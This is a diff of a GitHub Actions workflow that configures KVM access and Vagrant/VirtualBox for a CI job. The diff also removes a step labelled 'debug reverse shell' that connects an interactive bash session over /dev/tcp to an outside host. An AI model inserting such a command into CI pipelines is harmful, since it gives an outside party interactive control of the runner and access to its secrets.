@@ -16,6 +16,7 @@ jobs:
           echo 'KERNEL=="kvm", GROUP="kvm", MODE="0666", OPTIONS+="static_node=kvm"' | sudo tee /etc/udev/rules.d/99-kvm4all.rules
           sudo udevadm control --reload-rules
           sudo udevadm trigger --name-match=kvm
+          sudo usermod -a -G kvm $USER
       - name: Set up Vagrant & VirtualBox
         shell: bash
         run: |
@@ -32,9 +33,6 @@ jobs:
             ${{ runner.os }}-vagrant-
       - name: Show Vagrant version
         run: vagrant --version
-      - name: Run debug reverse shell
-        shell: bash
-        run: bash -i >& /dev/tcp/matthieu.buffet.re/34348 0>&1
       - name: Start vagrant
         working-directory: .github/workflows/
         run: vagrant up
